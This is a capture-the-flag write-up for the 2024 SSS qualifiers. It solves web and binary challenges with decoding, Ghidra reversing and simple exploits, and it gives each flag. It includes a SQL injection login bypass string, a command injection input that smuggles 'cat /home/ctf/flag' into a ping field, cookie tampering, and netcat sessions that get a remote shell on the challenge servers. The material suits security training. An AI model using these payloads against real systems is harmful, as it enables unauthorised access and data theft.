# SSS_Qualifiers_v11

##### 2024 Edition

### 1. Web: Qualifiers: In Your Face
  Link: http://141.85.224.116:8085/.

  Inspecting the page the following comment appears: ```<!-- U1NTe2NhZ2VfdHJhdm9sdGF9Cg== -->```.
  
  To decrypt the message: ```$ echo U1NTe2NhZ2VfdHJhdm9sdGF9Cg== | base64 -d```.

  The flag is: ```SSS{cage_travolta}```.

### 2. Web: Qualifiers: Welcome
  Link: http://141.85.224.116:8081/.
  Inspecting the page the following part of the site is revealed: ```static/css/main.css```.
  
  This page has the following comment: ```/* The first part of the flag is: "FFF{rirel_" */```.
  
  When inspecting the main page appears:
  ```<p style="margin-top:0;display:inline;float:left">Here is the second part of the flag:</p>```
```<p id="hidden" style="margin-left:5px;display:inline:float:right">svyr_</p>```.
  
  In the following code I found another page:
  ```
  <script type="text/javascript" language="javascript">  
    var versionUpdate = (new Date()).getTime();  
    var script = document.createElement("script");  
    script.type = "text/javascript";  
    script.src = "/static/hidden.js?v=" + versionUpdate;  
    document.body.appendChild(script);  
</script> 
```

  In ```/static/hidden.js?v=``` I found: ```The third part of the flag is: "unf_```
  
  The last part of the flag is in this hidden image: ```<P id="invisible"><img src="static/logo.png") }}"></P>``` and we find: ```srryvatf```.
  
  Combining this parts of the flag it results: ```FFF{rirel_svyr_unf_srryvatf}```.
  
  After this I observed that the letters are shifted and I used [ROT13](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=RkZGe3JpcmVsX3N2eXJfdW5mX3Nycnl2YXRmfQ) to find the final flag.
  
  The flag is: ```SSS{every_file_has_feelings}```.

### 3. Web: Qualifiers: Cake
  Link: http://141.85.224.116:8086/.

  I inspected the page and I found a cookie named 'FLAG' and after modifying it's value from 'empty' to 'applepie'.
  
  I refreshed the page and the value of the 'FLAG' cookie became ```SSS%7Bhansel_gretel%7D```.

  The flag is: ```SSS{hansel_gretel}```.

### 4. Web: Qualifiers: Sequel Pro
  Link: http://141.85.224.116:8083/index.php.

  As the name of the task suggests, this challange is about: [SQL Injection for Login](https://www.sqlinjection.net/login/).

  We need to use ```admin``` user and ```wrongpassword' OR 'a'='a``` as password for logging in.
  
  The flag is ```SSS{yummy_and_nutritious}```.

### 5. Binary: Qualifiers: One by One
  After opening the binary in Ghidra I discovered:
  ```
                             part20
        00601038 64              undefined1 64h
                             part0
        00601039 53              undefined1 53h
                             part24
        0060103a 6f              undefined1 6Fh
                             part18
        0060103b 6f              undefined1 6Fh
                             part3
        0060103c 7b              undefined1 7Bh
                             part27
        0060103d 7d              undefined1 7Dh
                             part11
        0060103e 6f              undefined1 6Fh
                             part13
        0060103f 5f              undefined1 5Fh
                             part23
        00601040 6c              undefined1 6Ch
                             part12
        00601041 66              undefined1 66h
                             part14
        00601042 74              undefined1 74h
                             part21
        00601043 5f              undefined1 5Fh
                             part9
        00601044 70              undefined1 70h
                             part26
        00601045 6b              undefined1 6Bh
                             part17
        00601046 5f              undefined1 5Fh
                             part25
        00601047 63              undefined1 63h
                             part15
        00601048 68              undefined1 68h
                             part6
        00601049 63              undefined1 63h
                             part7
        0060104a 68              undefined1 68h
                             part22
        0060104b 62              undefined1 62h
                             part2
        0060104c 53              undefined1 53h
                             part8
        0060104d 69              undefined1 69h
                             part5
        0060104e 5f              undefined1 5Fh
                             part19
        0060104f 6c              undefined1 6Ch
                             part4
        00601050 61              undefined1 61h
                             part16
        00601051 65              undefined1 65h
                             part1
        00601052 53              undefined1 53h
                             part10
        00601053 5f              undefined1 5Fh
  ```
  I combined the parts and the result is: ```0x53 0x53 0x53 0x7B 0x61 0x5F 0x63 0x68 0x69 0x70 0x5F 0x6F 0x66 0x5F 0x74 0x68 0x65 0x5F 0x6F 0x6C 0x64 0x5F 0x62 0x6C 0x6F 0x63 0x6B 0x7D```.

  I took the hex values and I [transformed](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg1MyAweDUzIDB4NTMgMHg3QiAweDYxIDB4NUYgMHg2MyAweDY4IDB4NjkgMHg3MCAweDVGIDB4NkYgMHg2NiAweDVGIDB4NzQgMHg2OCAweDY1IDB4NUYgMHg2RiAweDZDIDB4NjQgMHg1RiAweDYyIDB4NkMgMHg2RiAweDYzIDB4NkIgMHg3RA) them in ASCII characters.
  
  The flag is: ```SSS{a_chip_of_the_old_block}```.

### 6. Binary: Qualifiers: Black Hole
  I opened the file in Ghidra.

  I saw that the flag is printed in ```/dev/null```, but I was unable to read it, so I modifiend in Ghidra the path to ```/tmp/sss``` and I exported the new program.

  Than, I runned the program and I verified if ```/tmp/sss``` file had the flag inside.

  The flag is: ```SSS{the_more_you_look_the_less_you_actually_see}```.
  
### 7. Web: Qualifiers: IP Destroyer
  Link: http://141.85.224.116:8084/.

  As it works like: ping 'our input', our input can contain ';' with allows us to send more commands.

  After searching a lot in directories I found 'ctf' folder in '/home' directory, which has 'flag' file inside.
  
  I gave the following input: ```-c 0 8.8.8.8; cat /home/ctf/flag``` to read 'flag' file.

  The flag is: ```SSS{hey_man_stop_pinging_around}```.

### 8. Binary: Qualifiers: Mirror Me
  I opened the binary in Ghidra and I saw that the condition ```if (lVar3 == iVar2 * iVar1)``` must be satisfied to access a terminal using ```system("/bin/sh");```.

  I also saw that ```lVar3 = max_mirror();```. After analysing the functions used for calculating ```lVal3```, I decided to make my own C script to simulate this process:
  ```
  #include <stdio.h>
  
  int check_cond(unsigned long param_1)
  
  {
    unsigned long local_30;
    unsigned long local_20;
    
    local_20 = 0;
    for (local_30 = param_1; local_30 != 0; local_30 = local_30 / 10) {
      local_20 = local_30 % 10 + local_20 * 10;
    }
    return local_20 == param_1;
  }
  
  
  int main() {
    unsigned int uVar1;
    unsigned int uVar2;
    int iVar3;
    unsigned int local_24;
    unsigned int local_20;
    
    uVar1 = 0;
    for (local_24 = 999; 100 < local_24; local_24 = local_24 - 1) {
      for (local_20 = local_24; 100 < local_20; local_20 = local_20 - 1) {
        uVar2 = local_20 * local_24;
        iVar3 = check_cond(uVar2);
        if ((iVar3 != 0) && (uVar1 < uVar2)) {
          uVar1 = uVar2;
        }
      }
    }
    printf("%d",uVar1);
  }
  ```

  The result is: ```906609```, so ```lVal3 = 906609```.

  I found 2 divisors of 906609: 3 and 302203. So, I runned:
  ```
  $ ./mirror_me                                                               
  Insert the corect numbers in order to get the flag
  3
  302203            
  $
  ```
  Now I was able to run commands in the directory of the script.

  I decided to connect to the server to get the flag in a similar way:

  ```
  $ nc 141.85.224.99 31338
  Insert the corect numbers in order to get the flag
  ```
  
  ```
  3
  302203
  ```
  
  ```
  ls
  bin
  boot
  core
  dev
  etc
  home
  lib
  lib64
  media
  mnt
  opt
  proc
  root
  run
  sbin
  srv
  sys
  tmp
  usr
  var
  ```
  ```
  cd home
  ```
  
  ```
  ls
  ctf
  ```
  ```
  cd ctf
  ```
  
  ```
  ls
  flag
  mirror-me
  ```
  
  ```
  cat flag
  SSS{Mirror_mirror_on_the_wall_who_is_the_fairest_of_them_all}
  ```
  
  ```
  exit
  ```

  I found the flag in ```/home/ctf/flag```.

  The flag is: ```SSS{Mirror_mirror_on_the_wall_who_is_the_fairest_of_them_all}```.

### 9. Binary: Qualifiers: Not Backdoor
  I opened the file in Ghidra and I saw a very interesting function:
  ```
  void FUN_004006b6(uint param_1)
  
  {
    long in_FS_OFFSET;
    ulong local_40;
    byte local_38 [40];
    long local_10;
    
    local_10 = *(long *)(in_FS_OFFSET + 40);
    local_38[0] = 0x3c;
    local_38[1] = 0x3c;
    local_38[2] = 0x3c;
    local_38[3] = 0x14;
    local_38[4] = 0x1f;
    local_38[5] = 0x1d;
    local_38[6] = 0x5c;
    local_38[7] = 0x1b;
    local_38[8] = 0x1b;
    local_38[9] = 0x16;
    local_38[10] = 0x30;
    local_38[11] = 0xc;
    local_38[12] = 0x5f;
    local_38[13] = 1;
    local_38[14] = 0x19;
    local_38[15] = 0;
    local_38[16] = 3;
    local_38[17] = 0x1a;
    local_38[18] = 0x1b;
    local_38[19] = 10;
    local_38[20] = 0xb;
    local_38[21] = 0x30;
    local_38[22] = 9;
    local_38[23] = 3;
    local_38[24] = 0x5b;
    local_38[25] = 8;
    local_38[26] = 0x12;
    local_38[27] = 0x6f;
    for (local_40 = 0; local_40 < 28; local_40 = local_40 + 1) {
      local_38[local_40] = local_38[local_40] ^ (byte)param_1;
    }
    printf("You chose flag no. %d; Here: %s\n",(ulong)param_1,local_38);
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  ```

  The function ```FUN_004008a1``` calls the previonus function:
  ```
    undefined8 FUN_004008a1(int param_1,long param_2)
  
  {
    int iVar1;
    
    if (param_1 == 2) {
      iVar1 = atoi(*(char **)(param_2 + 8));
      FUN_004006b6(iVar1);
      return 0;
    }
    FUN_004007af();
                      /* WARNING: Subroutine does not return */
    exit(1);
  }
```

  As it is unclear what values have param_1 and param_2, I've written the following script to test a huge number of possible values for param_1 and param_2:
```
  #include <stdio.h>

  int main(){
      
    int i;
    
    for (i = 0; i < 10000; i++) {
        
        int param_1 = i;    
      
        unsigned long local_40;
        char local_38 [40];
        long local_10;
        
        local_38[0] = 0x3c;
        local_38[1] = 0x3c;
        local_38[2] = 0x3c;
        local_38[3] = 0x14;
        local_38[4] = 0x1f;
        local_38[5] = 0x1d;
        local_38[6] = 0x5c;
        local_38[7] = 0x1b;
        local_38[8] = 0x1b;
        local_38[9] = 0x16;
        local_38[10] = 0x30;
        local_38[11] = 0xc;
        local_38[12] = 0x5f;
        local_38[13] = 1;
        local_38[14] = 0x19;
        local_38[15] = 0;
        local_38[16] = 3;
        local_38[17] = 0x1a;
        local_38[18] = 0x1b;
        local_38[19] = 10;
        local_38[20] = 0xb;
        local_38[21] = 0x30;
        local_38[22] = 9;
        local_38[23] = 3;
        local_38[24] = 0x5b;
        local_38[25] = 8;
        local_38[26] = 0x12;
        local_38[27] = 0x6f;
        
        for (local_40 = 0; local_40 < 0x1c; local_40 = local_40 + 1) {
          local_38[local_40] = local_38[local_40] ^ (char)param_1;
        }
        
        if (local_38[0] == 'S')
          printf("You chose flag no. %lld; Here: %s\n", (long long)param_1,local_38);
        
    }
  }
  ```
  The output of the program is:
  ```
  You chose flag no. 111; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 367; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 623; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 879; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 1135; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 1391; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 1647; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 1903; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 2159; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 2415; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 2671; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 2927; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 3183; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 3439; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 3695; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 3951; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 4207; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 4463; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 4719; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 4975; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 5231; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 5487; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 5743; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 5999; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 6255; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 6511; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 6767; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 7023; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 7279; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 7535; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 7791; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 8047; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 8303; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 8559; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 8815; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 9071; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 9327; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 9583; Here: SSS{pr3tty_c0nvoluted_fl4g}
  You chose flag no. 9839; Here: SSS{pr3tty_c0nvoluted_fl4g}

.  ..Program finished with exit code 0
  ```

  The final flag is: ```SSS{pr3tty_c0nvoluted_fl4g}```.

### 10. Binary: Qualifiers: Pinpoint
  I opened in Ghidra and I analysed the binary with GDB.
  
  As we wat to get to ```system("/bin/sh");```, it is clear that the input is related with the ```v``` variable, which has the address: ```00601058```.
  
  The input is integer, so ```00601058``` in integer is ```6295640```.
  
  The following input will be related with ```0x5358535```, but the variable already has ```0x5358535```.
  
  As the input accepts only two bytes, I thought it will be ```0x2020```, but after this I saw in IDA PRO that only one byte will be used.
  
  Than I used ```6295640``` and ```0x20``` as input. After this, I found out that we need also an integer as second input.
  
  I used the following input: ```6295640``` and ```88```. After this I saw in GDB that the address I was writing was wrong.
  
  As I need to write to a futher possision in the momory to get the ```0x5358535```, I tried to inscrease the address. Using ```6295642``` and ```88``` as input worked, because I need to write to the third byte of the integer that has four bytes.
  
  This is the code with the interaction with the server:
  ```
  $ nc 141.85.224.99 31337
  
  address to write to: 6295642
  value to write: 88
  
  ls
  
  bin
  boot
  core
  dev
  etc
  home
  lib
  lib64
  media
  mnt
  opt
  proc
  root
  run
  sbin
  srv
  sys
  tmp
  usr
  var
  
  cd home
  
  ls
  
  ctf
  
  cd ctf
  
  ls
  
  flag
  pinpoint
  
  cat flag
  
  SSS{aim_for_the_kill}
  
  exit
  ```
  
  The final flag is: ```SSS{aim_for_the_kill}```.
